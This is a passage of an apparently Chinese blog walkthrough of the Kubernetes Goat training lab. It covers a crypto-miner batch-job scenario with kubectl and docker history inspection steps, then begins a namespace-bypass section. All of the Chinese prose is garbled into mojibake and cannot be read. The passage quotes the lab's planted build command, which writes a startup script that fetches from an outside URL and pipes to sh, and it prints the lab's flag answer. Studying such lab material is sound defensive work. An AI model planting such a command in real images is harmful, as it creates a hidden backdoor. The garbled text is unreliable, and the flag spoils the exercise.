ZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-19%2014.23.44.png" style="zoom:50%;">

<p>ç”±äºNodePorté…ç½®ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®ä¸å…¬å¼€çš„å†…éƒ¨æœåŠ¡ã€‚</p>
<h2 id="3-7-Analyzing-crypto-miner-container-bug"><a href="#3-7-Analyzing-crypto-miner-container-bug" class="headerlink" title="3.7 Analyzing crypto miner container[bug]"></a>3.7 Analyzing crypto miner container[bug]</h2><p>åˆ†æk8sé›†ç¾¤ä¸­çš„æŒ–çŸ¿å®¹å™¨ã€‚</p>
<h3 id="3-7-1-åœºæ™¯ä»‹ç»"><a href="#3-7-1-åœºæ™¯ä»‹ç»" class="headerlink" title="3.7.1 åœºæ™¯ä»‹ç»"></a>3.7.1 åœºæ™¯ä»‹ç»</h3><p>åŠ å¯†è´§å¸æŒ–çŸ¿æ”»å‡»æ­£è‚†è™ç°ä»£äº‘å¹³å°ï¼Œå°¤å…¶åƒKubernetesè¿™æ ·çš„å®¹å™¨ç¼–æ’ç³»ç»Ÿæ›´æ˜¯å¤©ç„¶çš„æ”»å‡»é¶åœºâ€”â€”æ¯•ç«Ÿå¤§å®¶å¾€å¾€ä¸ä¼šæ·±ç©¶å®¹å™¨é•œåƒçš„åº•å±‚ç»„ä»¶ï¼Œä¹Ÿç¼ºä¹ä¸»åŠ¨ç›‘æ§æœºåˆ¶ã€‚æœ¬æ¡ˆä¾‹å±•ç¤ºå¦‚ä½•åˆ†æk8så®¹å™¨ä¸­æš—è—çš„â€æŒ–çŸ¿æ€æ‰‹â€ã€‚</p>
<p>å¾ˆå¤šä½¿ç”¨å®¹å™¨çš„å¼€å‘è€…éƒ½ä¼šä»Docker Hubè¿™ç±»å…¬å…±é•œåƒä»“åº“ä¸‹è½½é•œåƒï¼Œä½†è¿™äº›å¹³å°ç»å¸¸è¢«é»‘ã€‚æ”»å‡»è€…ä¼šæ•…æ„ä¸Šä¼ æ¤å…¥æŒ–çŸ¿ç¨‹åºçš„é•œåƒï¼Œå·å·å ç”¨å—å®³è€…çš„æœåŠ¡å™¨èµ„æºã€‚</p>
<p>æ”»å‡»è€…æƒ¯ç”¨çš„æ‰‹æ³•å°±æ˜¯æŠŠæŒ–çŸ¿é•œåƒå¡è¿›å…¬å…±å®¹å™¨ä»“åº“ï¼ˆæ¯”å¦‚Docker Hubï¼‰ã€‚è¿™äº›é•œåƒçš„Dockerfileæ— ä»æŸ¥éªŒï¼Œæ‰€ä»¥æ ¹æœ¬ä¸çŸ¥é“å®ƒä»¬æ˜¯æ€ä¹ˆæ„å»ºçš„â€”â€”ç»“æœä¸€ä¸ç•™ç¥å°±æŠŠçŸ¿æœºç»™è·‘èµ·æ¥äº†ã€‚</p>
<p>å®è·µç›®çš„ï¼š</p>
<ul>
<li>å¦‚ä½•åˆ†æå®¹å™¨é•œåƒï¼›</li>
<li>ç†è§£ Kubernetes ä»»åŠ¡åŠå…¶æ“ä½œæ–¹å¼ï¼›</li>
<li>æŒæ¡å®¹å™¨é•œåƒæ¸…å•ä¸­åé—¨å’ŒåŠ å¯†çŸ¿å·¥çš„è¯†åˆ«æ–¹æ³•ã€‚</li>
</ul>
<h3 id="3-7-2-åœºæ™¯è®¿é—®"><a href="#3-7-2-åœºæ™¯è®¿é—®" class="headerlink" title="3.7.2 åœºæ™¯è®¿é—®"></a>3.7.2 åœºæ™¯è®¿é—®</h3><p>é¦–å…ˆï¼Œç¡®å®šKubernetesé›†ç¾¤ä¸­çš„æ‰€æœ‰èµ„æºã€é•œåƒå’Œä½œä¸šã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl get <span class="token function">jobs</span> <span class="token parameter variable">-A</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p><code>kubectl get jobs -A</code> å‘½ä»¤ç”¨äºåœ¨ Kubernetes é›†ç¾¤ä¸­<strong>åˆ—å‡ºæ‰€æœ‰å‘½åç©ºé—´ï¼ˆNamespaceï¼‰ä¸‹çš„ Job èµ„æº</strong>ï¼Œå¹¶æ˜¾ç¤ºå®ƒä»¬çš„å…³é”®çŠ¶æ€ä¿¡æ¯ã€‚</p>
</blockquote>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2011.15.41.png" style="zoom:40%;">

<p>ç›®æ ‡ï¼šåœ¨æ‰¹å¤„ç†ä½œä¸šå®¹å™¨é•œåƒä¸­æ‰¾åˆ°k8s_goat_flagæ ‡å¿—å€¼ã€‚</p>
<h3 id="3-7-3-å®è·µ"><a href="#3-7-3-å®è·µ" class="headerlink" title="3.7.3 å®è·µ"></a>3.7.3 å®è·µ</h3><ul>
<li>æ’æŸ¥k8sä¸­çš„job</li>
</ul>
<blockquote>
<p> æ’æŸ¥Kubernetesé›†ç¾¤å†…çš„æ‰€æœ‰èµ„æºã€‚å°½å¯èƒ½è¯¦ç»†æ£€æŸ¥é›†ç¾¤å„èŠ‚ç‚¹ä¸­æ‰€æœ‰å¯ç”¨çš„å®¹å™¨é•œåƒã€‚</p>
</blockquote>
<p>ä¸€æ—¦æˆ‘ä»¬ç¡®å®šäº†Kubernetesé›†ç¾¤ä¸­çš„ä½œä¸šï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥è·å–jobçš„ä¿¡æ¯ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl describe job batch-check-job<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p><strong>æŸ¥çœ‹åä¸º <code>batch-check-job</code> çš„ Job èµ„æºçš„è¯¦ç»†ä¿¡æ¯</strong>ï¼ŒåŒ…æ‹¬é…ç½®ã€çŠ¶æ€ã€äº‹ä»¶ä»¥åŠä¸å…³è”çš„ Pod çš„è°ƒè¯•ä¿¡æ¯ã€‚</p>
</blockquote>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2011.32.48.png" style="zoom:50%;">

<ul>
<li>æ’æŸ¥å¯ç–‘jobç›¸å…³è”çš„pod</li>
</ul>
<p>è¿è¡Œä¸‹é¢çš„å‘½ä»¤è·å–podä¿¡æ¯ï¼Œè¯¥å‘½ä»¤æ˜¾ç¤ºäº†å¸¦æœ‰æ ‡ç­¾å’Œé€‰æ‹©å™¨åŒ¹é…çš„pod:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl get pods <span class="token parameter variable">--namespace</span> default <span class="token parameter variable">-l</span> <span class="token string">"job-name=batch-check-job"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p><strong>åˆ—å‡º <code>default</code> å‘½åç©ºé—´ä¸­ï¼Œæ ‡ç­¾ï¼ˆLabelï¼‰ä¸º <code>job-name=batch-check-job</code> çš„æ‰€æœ‰ Pod</strong>ã€‚</p>
<p><strong>æ ¸å¿ƒä½œç”¨</strong></p>
<ol>
<li><strong>æŒ‰æ ‡ç­¾è¿‡æ»¤ Pod</strong><br>Kubernetes ä¸­çš„ Job åœ¨åˆ›å»º Pod æ—¶ï¼Œè‡ªåŠ¨ä¸º Pod æ·»åŠ  <code>job-name=&lt;Jobåç§°&gt;</code> çš„æ ‡ç­¾ã€‚æ­¤å‘½ä»¤é€šè¿‡æ ‡ç­¾ç­›é€‰å‡ºè¯¥ Job åˆ›å»ºçš„æ‰€æœ‰ Podã€‚</li>
<li><strong>æ£€æŸ¥ Job è¿è¡Œçš„ Pod</strong><br>Job æ‰§è¡Œçš„ä»»åŠ¡å®é™…æ˜¯ç”±å®ƒåˆ›å»ºçš„ Pod å®Œæˆçš„ã€‚é€šè¿‡æ­¤å‘½ä»¤å¯ä»¥ï¼š<ul>
<li>æŸ¥çœ‹ Pod çš„è¿è¡ŒçŠ¶æ€ï¼ˆå¦‚ <code>Completed</code>ã€<code>Error</code>ã€<code>Pending</code>ï¼‰ã€‚</li>
<li>ç¡®è®¤ä»»åŠ¡æ˜¯å¦æˆåŠŸæ‰§è¡Œï¼ˆæˆåŠŸå®Œæˆçš„ Pod çŠ¶æ€ä¸º <code>Completed</code>ï¼‰ã€‚</li>
<li>å¿«é€Ÿå®šä½å¤±è´¥çš„ Podï¼Œè¿›ä¸€æ­¥è°ƒè¯•æ—¥å¿—ï¼ˆä½¿ç”¨ <code>kubectl logs &lt;pod-name&gt;</code>ï¼‰ã€‚</li>
</ul>
</li>
</ol>
</blockquote>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2013.36.32.png" style="zoom:50%;">

<ul>
<li>æ’æŸ¥podçš„è¯¦ç»†é…ç½®ä¿¡æ¯</li>
</ul>
<p>å¯ä»¥é€šè¿‡è¿è¡Œä»¥ä¸‹å‘½ä»¤è·å¾—podè§„èŒƒçš„æ‰€æœ‰ä¿¡æ¯ï¼Œè¯¥å‘½ä»¤ä»¥YAMLè¾“å‡ºæ ¼å¼è¿”å›æ•´ä¸ªæ¸…å•ä¿¡æ¯</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl get pod batch-check-job-dcfgg <span class="token parameter variable">-o</span> yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p><strong>ä»¥ YAML æ ¼å¼è¾“å‡ºæŒ‡å®š Pod çš„å®Œæ•´é…ç½®å’Œå®æ—¶çŠ¶æ€ä¿¡æ¯</strong>ã€‚</p>
<p><strong>æ ¸å¿ƒä½œç”¨</strong></p>
<ol>
<li><strong>æŸ¥çœ‹ Pod çš„å®Œæ•´å®šä¹‰</strong><br>åŒ…æ‹¬å®¹å™¨é•œåƒã€ç¯å¢ƒå˜é‡ã€å·æŒ‚è½½ã€èµ„æºé™åˆ¶ç­‰<strong>å£°æ˜å¼é…ç½®</strong>â€‹ï¼ˆ<code>.spec</code> éƒ¨åˆ†ï¼‰ã€‚</li>
<li><strong>è·å–å®æ—¶çŠ¶æ€</strong><br>åŒ…å« Pod çš„å½“å‰çŠ¶æ€ï¼ˆå¦‚ <code>Running</code>ã€<code>Pending</code>ã€<code>Failed</code>ï¼‰ã€å®¹å™¨çŠ¶æ€ã€IP åœ°å€ã€äº‹ä»¶ç­‰<strong>è¿è¡Œæ—¶ä¿¡æ¯</strong>â€‹ï¼ˆ<code>.status</code> éƒ¨åˆ†ï¼‰ã€‚</li>
<li><strong>è°ƒè¯•ä¸åˆ†æ</strong><br>é€šè¿‡ YAML çš„å®Œæ•´ä¿¡æ¯ï¼Œå¯ä»¥å¿«é€Ÿå®šä½ä»¥ä¸‹é—®é¢˜ï¼š<ul>
<li><strong>å®¹å™¨å¯åŠ¨å¤±è´¥</strong>ï¼ˆå¦‚é•œåƒæ‹‰å–é”™è¯¯ã€å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼‰ã€‚</li>
<li><strong>èµ„æºä¸è¶³</strong>ï¼ˆå¦‚ CPU/å†…å­˜è¯·æ±‚è¶…å‡ºèŠ‚ç‚¹å¯ç”¨èµ„æºï¼‰ã€‚</li>
<li><strong>ç½‘ç»œæˆ–å­˜å‚¨é…ç½®é—®é¢˜</strong>ï¼ˆå¦‚ PersistentVolume ç»‘å®šå¤±è´¥ï¼‰ã€‚</li>
</ul>
</li>
</ol>
</blockquote>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2013.41.24.png" style="zoom:30%;">

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2013.47.38.png" style="zoom:40%;">

<p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªè¿™ä¸ªä½œä¸špodæ­£åœ¨è¿è¡Œdocker.io/madhuakula/k8s-goat-batch-check dockerå®¹å™¨é•œåƒï¼š</p>
<ul>
<li>åˆ†æé•œåƒæ„å»ºå‘½ä»¤</li>
</ul>
<p>ç°åœ¨æˆ‘ä»¬å¯ä»¥å¯¹å®¹å™¨é•œåƒåƒè¿›è¡Œåˆ†æï¼ŒæŸ¥çœ‹å®ƒçš„layersä»¥åŠå®ƒæ˜¯å¦‚ä½•åˆ›å»ºçš„ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ä¸­ä¸€å±‚åŒ…å«äº†åœ¨æ„å»ºæ—¶æ‰§è¡Œå¤–éƒ¨è„šæœ¬çš„å‘½ä»¤ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">history</span> --no-trunc docker.io/madhuakula/k8s-goat-batch-check<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p><strong>æŸ¥çœ‹æŒ‡å®š Docker é•œåƒçš„æ„å»ºå†å²ï¼ˆå„å±‚æŒ‡ä»¤çš„å®Œæ•´å‘½ä»¤ï¼‰</strong>ï¼Œç”¨äºåˆ†æé•œåƒçš„æ„å»ºè¿‡ç¨‹ã€ä¾èµ–é¡¹åŠæ½œåœ¨é—®é¢˜ã€‚</p>
<p>å‘½ä»¤è§£æ:</p>
<ol>
<li><strong><code>docker history</code></strong><br>Docker CLI å­å‘½ä»¤ï¼Œç”¨äºæ˜¾ç¤ºé•œåƒçš„æ„å»ºå†å²ï¼ˆå„å±‚çš„åˆ›å»ºæ­¥éª¤ï¼‰ã€‚</li>
<li><strong><code>--no-trunc</code></strong><br>æ˜¾ç¤º<strong>å®Œæ•´å‘½ä»¤</strong>â€‹ï¼ˆä¸æˆªæ–­è¾“å‡ºï¼‰ï¼Œé¿å…çœç•¥é•¿æŒ‡ä»¤ï¼ˆå¦‚ <code>RUN</code> åçš„å¤æ‚è„šæœ¬ï¼‰ã€‚</li>
</ol>
</blockquote>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2013.54.22.png" style="zoom:50%;">

<ul>
<li>åˆ†ææ¶æ„å‘½ä»¤</li>
</ul>
<p>ç¯å¢ƒé—®é¢˜æ²¡æœ‰åœ¨docker historyä¸­æ‰¾åˆ°curlæ¶æ„å‘½ä»¤[bug]ï¼Œæ­£å¸¸æƒ…å†µä¸‹ä¼šåœ¨æ„å»ºå‘½ä»¤ä¸­çœ‹åˆ°å¦‚ä¸‹çš„æ¶æ„å‘½ä»¤ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"curl -sSL https://madhuakula.com/kubernetes-goat/k8s-goat-a5e0a28fa75bf429123943abedb065d1 &amp;&amp; echo 'id' | sh "</span> <span class="token operator">&gt;</span> /usr/bin/system-startup <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> +x /usr/bin/system-startup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2014.12.10.png" style="zoom:50%;">

<ul>
<li>flag</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">k8s-goat-a5e0a28fa75bf429123943abedb065d1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="3-8-Kubernetes-namespaces-bypassğŸŒŸ"><a href="#3-8-Kubernetes-namespaces-bypassğŸŒŸ" class="headerlink" title="3.8 Kubernetes namespaces bypassğŸŒŸ"></a>3.8 Kubernetes namespaces bypassğŸŒŸ</h2><p>k8så‘½åç©ºé—´ç»•è¿‡ï¼šä»k8s podä¸­ç»•è¿‡k8s Namespaceæ¥è®¿é—®é›†ç¾¤ã€‚</p>
<h3 id="3-8-1-åœºæ™¯ä»‹ç»"><a href="#3-8-1-åœºæ™¯ä»‹ç»" class="headerlink" title="3.8.1 åœºæ™¯ä»‹ç»"></a>3.8.1 åœºæ™¯ä»‹ç»</h3><p>å¾ˆå¤šäººä»¥ä¸ºï¼Œåªè¦æŠŠèµ„æºéƒ¨ç½²åœ¨ä¸åŒçš„å‘½åç©ºé—´ï¼ˆnamespaceï¼‰é‡Œï¼Œå®ƒä»¬å°±æ˜¯å®‰å…¨çš„ï¼Œå½¼æ­¤æ— æ³•äº’ç›¸è®¿é—®ï¼Œè¿™æ˜¯ Kubernetes ä¸–ç•Œé‡Œä¸€ä¸ªå·¨å¤§çš„è¯¯åŒºã€‚ç°å®ä¸­ï¼Œä¸å°‘å¤šç”¨æˆ·ç¯å¢ƒæ­£æ˜¯å› ä¸ºè¿™ç§è¯¯è§£è€Œè¢«æ”»ç ´ï¼Œå¯¼è‡´å…³é”®èµ„æºåœ¨é›†ç¾¤å†…éƒ¨æš´éœ²ã€‚</p>
